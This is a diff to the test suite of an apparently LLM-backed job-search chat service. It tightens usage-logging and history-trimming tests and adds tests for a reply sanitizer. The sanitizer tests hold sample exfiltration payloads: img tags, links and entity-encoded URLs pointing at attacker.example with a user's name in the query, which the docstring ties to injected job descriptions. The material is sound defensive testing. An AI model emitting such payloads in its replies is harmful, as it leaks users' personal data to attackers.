@@ -2219,7 +2219,10 @@ class SendChatMessageTests(_ChatServiceFixture, TestCase):
 
     def test_a_turn_that_hits_the_call_bound_still_writes_a_usage_row(self):
         """Eight Pro calls were billed by the provider before the bound fired.
-        Losing that row hides real, user-triggerable spend."""
+        Losing that row hides real, user-triggerable spend. The exact tuple
+        pins the value to 8 calls x (10, 5) tokens each — an implementation
+        that (incorrectly) billed the entire thread on the failure path would
+        also clear a merely-positive assertion."""
         from apps.ai.exceptions import AgentLimitExceededError
         from apps.ai.models import AIUsageLog
         from apps.ai.services import MAX_MODEL_CALLS_PER_TURN
@@ -2228,7 +2231,7 @@ class SendChatMessageTests(_ChatServiceFixture, TestCase):
         with self.assertRaises(AgentLimitExceededError):
             self._send("loop forever", responses=responses)
         row = AIUsageLog.objects.get(feature="chat")
-        self.assertGreater(row.input_tokens, 0)
+        self.assertEqual((row.input_tokens, row.output_tokens), (80, 40))
 
     # --- bounds --------------------------------------------------------------
 
@@ -2292,13 +2295,29 @@ class SendChatMessageTests(_ChatServiceFixture, TestCase):
                 checkpointer=saver)
             conversation_id = out["conversation_id"]
         self.assertLessEqual(max(seen), CHAT_HISTORY_MESSAGES)
-        self.assertGreater(len(seen), CHAT_HISTORY_MESSAGES // 2)
+        # len(seen) is always CHAT_HISTORY_MESSAGES (one model call per turn),
+        # regardless of whether trimming works — that tells us nothing. What
+        # must actually be true: history grew close to the cap before being
+        # trimmed back down, i.e. trimming was genuinely exercised rather
+        # than the window merely never reaching the cap in the first place.
+        self.assertGreater(max(seen), CHAT_HISTORY_MESSAGES // 2)
 
     def test_trimming_never_orphans_a_tool_message(self):
         """A raw tail slice starts the window on a ToolMessage whose parent
         AIMessage was cut. Gemini rejects a functionResponse with no preceding
         functionCall, so such a turn 502s — invisible to a fake model unless
-        asserted directly."""
+        asserted directly.
+
+        Uses THREE PARALLEL tool calls per turn (6 messages/turn: Human,
+        AI+3 tool_calls, Tool x3, AI) rather than one. With single tool calls
+        (4 messages/turn, a divisor of CHAT_HISTORY_MESSAGES=20) the trim
+        boundary always happens to land exactly on a turn boundary, so a
+        naive last-N slice never actually orphans anything in that shape and
+        this test would pass even against a broken implementation — verified
+        empirically by temporarily monkeypatching apps.ai.services.trim_messages
+        to a raw slice (see the task-5 fix report for the before/after proof).
+        Three parallel calls breaks that coincidental alignment.
+        """
         from langchain_core.messages import AIMessage, SystemMessage, ToolMessage
         from apps.ai.services import CHAT_HISTORY_MESSAGES, send_chat_message
         from apps.ai.testing import ScriptedFakeChatModel
@@ -2311,27 +2330,110 @@ class SendChatMessageTests(_ChatServiceFixture, TestCase):
                                 if not isinstance(m, SystemMessage)])
                 return super()._generate(messages, stop, run_manager, **kwargs)
 
+        def _parallel_toolcalls(turn, n=3):
+            from langchain_core.messages import AIMessage as _AIMessage
+            return _AIMessage(content="", tool_calls=[
+                {"name": "search_jobs", "args": {"keywords": "python"},
+                 "id": f"c{turn}-{i}"} for i in range(n)],
+                usage_metadata={"input_tokens": 10, "output_tokens": 5,
+                                "total_tokens": 15})
+
+        def _first_orphaned_tool_message(window):
+            """Walk back over runs of consecutive ToolMessages (produced by
+            parallel tool calls) to find the true parent — the immediately
+            preceding message is only the parent for the FIRST ToolMessage
+            in such a run; checking window[i - 1] naively for every
+            ToolMessage is itself wrong for parallel calls and would flag
+            perfectly well-formed windows as orphaned."""
+            i = 0
+            while i < len(window):
+                if isinstance(window[i], ToolMessage):
+                    start = i
+                    while start > 0 and isinstance(window[start - 1], ToolMessage):
+                        start -= 1
+                    parent = window[start - 1] if start > 0 else None
+                    if not (isinstance(parent, AIMessage) and parent.tool_calls):
+                        return window[i]
+                    while i < len(window) and isinstance(window[i], ToolMessage):
+                        i += 1
+                    continue
+                i += 1
+            return None
+
         saver = self._saver()
         conversation_id = None
-        # Each turn is 4 messages (Human, AI+tool_call, Tool, AI), so the
-        # boundary lands mid tool-sequence well before the loop ends.
         for turn in range(CHAT_HISTORY_MESSAGES):
             out = send_chat_message(
                 self.seeker, message=f"turn {turn}", conversation_id=conversation_id,
                 model=_Recording(responses=[
-                    self._toolcall("search_jobs", {"keywords": "python"},
-                                   call_id=f"c{turn}"),
-                    self._reply(f"r{turn}")]),
+                    _parallel_toolcalls(turn), self._reply(f"r{turn}")]),
                 checkpointer=saver)
             conversation_id = out["conversation_id"]
 
         for window in windows:
-            for i, message in enumerate(window):
-                if isinstance(message, ToolMessage):
-                    parent = window[i - 1] if i else None
-                    self.assertTrue(
-                        isinstance(parent, AIMessage) and parent.tool_calls,
-                        "orphaned ToolMessage in the model's window")
+            self.assertIsNone(_first_orphaned_tool_message(window),
+                              "orphaned ToolMessage in the model's window")
+
+    def test_oversized_single_turn_never_sends_the_model_an_empty_window(self):
+        """CRITICAL fix-round finding: trim_messages(..., start_on='human')
+        returns [] when the CURRENT turn alone is already longer than
+        CHAT_HISTORY_MESSAGES, because start_on='human' finds no HumanMessage
+        inside the trimmed tail — the turn's own HumanMessage has already
+        fallen outside the window. Without the `if not trimmed:` fallback in
+        _trim_history, request.override(messages=[]) then calls the model
+        with only the system prompt; real Gemini rejects empty `contents`
+        with a 400 (-> AIProviderError, a 502) on an ORDINARY turn, not an
+        edge case.
+
+        Two rounds of 12 parallel tool_calls each (Human + AI+12 Tool, twice)
+        comfortably clears CHAT_HISTORY_MESSAGES=20 in 3 model calls — well
+        under MAX_MODEL_CALLS_PER_TURN=8. Sequential single tool calls could
+        never reach this: 7 rounds (the most the 8-call bound allows before a
+        final reply) is only 1 + 2*7 + 1 = 16 messages, never enough to
+        trigger the bug. Parallel calls are what make a single turn outgrow
+        the window.
+        """
+        from langchain_core.messages import AIMessage, HumanMessage, SystemMessage
+        from apps.ai.services import CHAT_HISTORY_MESSAGES, send_chat_message
+        from apps.ai.testing import ScriptedFakeChatModel
+
+        windows = []
+
+        class _Recording(ScriptedFakeChatModel):
+            def _generate(self, messages, stop=None, run_manager=None, **kwargs):
+                windows.append([m for m in messages
+                                if not isinstance(m, SystemMessage)])
+                return super()._generate(messages, stop, run_manager, **kwargs)
+
+        def _parallel_round(round_num, n=12):
+            return AIMessage(content="", tool_calls=[
+                {"name": "search_jobs", "args": {"keywords": "python"},
+                 "id": f"r{round_num}-{i}"} for i in range(n)],
+                usage_metadata={"input_tokens": 10, "output_tokens": 5,
+                                "total_tokens": 15})
+
+        model = _Recording(responses=[
+            _parallel_round(1), _parallel_round(2), self._reply("Here you go.")])
+        out = send_chat_message(
+            self.seeker, message="find me every python job you can",
+            model=model, checkpointer=self._saver())
+
+        self.assertEqual(out["reply"], "Here you go.")
+        # Proves the fallback actually engaged (not just that trimming ran):
+        # a correctly-trimmed window can never exceed the cap, so a window
+        # bigger than CHAT_HISTORY_MESSAGES only happens via the whole-turn
+        # fallback.
+        self.assertGreater(max(len(w) for w in windows), CHAT_HISTORY_MESSAGES,
+                           "fallback never engaged — test setup didn't "
+                           "actually exceed the window")
+        for window in windows:
+            self.assertGreater(
+                len(window), 0,
+                "model was called with zero non-system messages — Gemini "
+                "rejects empty contents with a 400")
+            self.assertIsInstance(
+                window[0], HumanMessage,
+                "model's first message was not a HumanMessage")
 
     # --- provider failures ---------------------------------------------------
 
@@ -2394,3 +2496,62 @@ class SendChatMessageTests(_ChatServiceFixture, TestCase):
             self._send("my secret salary expectation is 200k",
                        responses=[self._reply("noted")])
         self.assertNotIn("200k", "\n".join(logs.output))
+
+
+class SanitizeReplyTests(TestCase):
+    """Direct coverage for _sanitize_reply. Fix-round finding: the pre-fix
+    implementation only stripped markdown images/links and http(s)/ftp/data
+    bare URLs — raw HTML tags, entity-encoded schemes, protocol-relative
+    URLs, and reference-style link targets all survived it and could still
+    exfiltrate a seeker's data to a job description's author."""
+
+    def _clean(self, text):
+        from apps.ai.services import _sanitize_reply
+        return _sanitize_reply(text)
+
+    # --- vectors that survived the pre-fix implementation --------------------
+
+    def test_strips_raw_img_tag_with_protocol_relative_src(self):
+        out = self._clean('Nice fit! <img src="//attacker.example/p?d=Ada">')
+        self.assertNotIn("attacker.example", out)
+        self.assertIn("Nice fit!", out)
+
+    def test_strips_reference_style_link_target(self):
+        out = self._clean("Good fit!\n\n[r]: //attacker.example/p?d=Ada")
+        self.assertNotIn("attacker.example", out)
+        self.assertIn("Good fit!", out)
+
+    def test_strips_entity_encoded_scheme_in_img_src(self):
+        out = self._clean('Nice! <img src="https&#58;//attacker.example/p">')
+        self.assertNotIn("attacker.example", out)
+        self.assertIn("Nice!", out)
+
+    def test_strips_raw_anchor_tag_but_keeps_visible_text(self):
+        out = self._clean(
+            'Check this: <a href="//attacker.example/p?d=Ada">hi</a>')
+        self.assertNotIn("attacker.example", out)
+        self.assertIn("hi", out)
+
+    # --- regression: behaviour that must still hold ---------------------------
+
+    def test_still_strips_markdown_image(self):
+        out = self._clean(
+            "Good fit! ![](https://attacker.example/p?d=Ada%20Lovelace)")
+        self.assertNotIn("attacker.example", out)
+        self.assertIn("Good fit!", out)
+
+    def test_still_keeps_markdown_link_text(self):
+        out = self._clean(
+            "See [this role](https://attacker.example/x) for more")
+        self.assertNotIn("attacker.example", out)
+        self.assertIn("this role", out)
+
+    def test_still_strips_autolink(self):
+        out = self._clean("Check <https://attacker.example/y> for details")
+        self.assertNotIn("attacker.example", out)
+
+    def test_indented_fenced_code_block_keeps_leading_indentation(self):
+        text = "Sure, here you go:\n\n    def foo():\n        return 1\n"
+        out = self._clean(text)
+        self.assertIn("    def foo():", out)
+        self.assertIn("        return 1", out)
